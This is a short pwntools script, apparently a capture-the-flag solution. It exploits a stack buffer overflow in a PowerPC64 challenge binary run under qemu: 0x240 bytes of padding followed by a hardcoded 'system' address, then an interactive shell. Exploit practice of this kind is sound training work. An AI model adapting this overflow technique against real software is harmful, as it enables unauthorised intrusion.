#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 2
qemu = 'qemu-ppc64'
libc_path = '/usr/powerpc64-linux-gnu/'

context(endian='be', os="linux")
context.log_level = "debug"
if debug == 1:
    p = process([qemu, '-g', '12345', '-L', libc_path, './pwn'])
elif debug == 2:
    p = process([qemu, '-L', libc_path, './pwn'])
else:
    p = remote('localhost', 9999)
addr_system = 0x100007e8

pd = 'a' * 0x240
pd += p64(addr_system)
p.sendlineafter('off..\n', pd)
p.interactive()
